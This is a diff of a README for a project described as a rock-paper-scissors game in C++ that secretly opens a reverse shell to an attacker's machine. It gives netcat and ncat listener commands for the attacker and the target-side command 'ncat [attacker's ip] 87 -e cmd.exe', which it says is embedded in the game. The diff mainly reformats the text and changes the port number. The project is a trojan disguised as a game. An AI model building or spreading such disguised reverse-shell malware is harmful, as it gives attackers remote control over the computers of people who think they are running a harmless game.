@@ -1,16 +1,17 @@
-# rock-paper-scissor
+# Rock-paper-scissor
 This is a rock paper scissor game written in c++ that uses reverse shell to establish connection back to attacker's machine from the target machine.
 
 # Get-started
 ### Attacker's machine
 
-linux: nc -lnvp 2000
-<p>windows: ncat -lnvp 87 </p>
-<p>N.B: 2000 is the port number used for listening to incoming connections</p>
+linux: `nc -lnvp 87`
+windows: `ncat -lnvp 87` 
+<p><b>NB</b>: 87 is the port number used for listening to incoming connections,</p>
 
 ### Target's machine
-<p>NB: The command to be executed are embedded in the game and are for windows users who have ncat installed already</P>
-<p>windows: ncat [attacker's ip] 87 -e cmd.exe</p>
+
+windows: `ncat [attacker's ip] 87 -e cmd.exe`
+<p><b>NB</b>: The command to be executed are embedded in the game and are for windows users who have ncat installed already.</P>
 
 ### How it works
 
